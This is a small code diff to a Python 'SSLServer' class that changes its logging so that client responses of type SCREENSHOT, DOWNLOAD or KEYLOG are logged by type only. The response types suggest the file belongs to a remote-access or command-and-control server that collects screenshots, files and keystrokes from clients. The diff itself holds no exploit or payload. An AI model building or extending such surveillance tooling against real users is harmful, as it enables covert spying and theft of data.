@@ -246,7 +246,14 @@ class SSLServer:
 
                     print(response)
 
-                logger.info("Client responded: %s", response)
+                if response_type not in (
+                    "SCREENSHOT",
+                    "DOWNLOAD",
+                    "KEYLOG",
+                ):
+                    logger.info("Client responded: %s", response)
+                else:
+                    logger.info("Client responded: with %s", response_type)
 
         except Exception as e:
 
